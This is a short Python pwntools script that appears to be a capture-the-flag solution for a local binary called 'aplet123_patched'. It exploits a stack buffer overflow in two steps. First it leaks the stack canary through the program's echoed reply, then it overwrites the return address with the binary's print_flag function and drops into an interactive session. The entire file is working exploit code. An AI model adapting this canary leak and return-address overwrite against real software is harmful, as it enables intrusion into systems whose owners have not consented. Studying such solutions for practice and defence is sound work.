#! /usr/bin/python3

from pwn import *

p = process("./aplet123_patched")
e = ELF("./aplet123_patched")
libc = ELF("./libc.so.6")

payload = b'A' * 0x45
payload += b"i'm"
p.sendlineafter(b"hello\n", payload)
pause()

p.recvuntil(b"hi ") 
canary = u64(b"\x00"+(p.recv(7)))
print(hex(canary))


payload = b'A'*0x48
payload += p64(canary)
payload += b'B'*0x8
payload += p64(e.symbols['print_flag'])
p.sendlineafter(b"123\n", payload)
p.sendline(b'bye')

pause()

p.interactive()
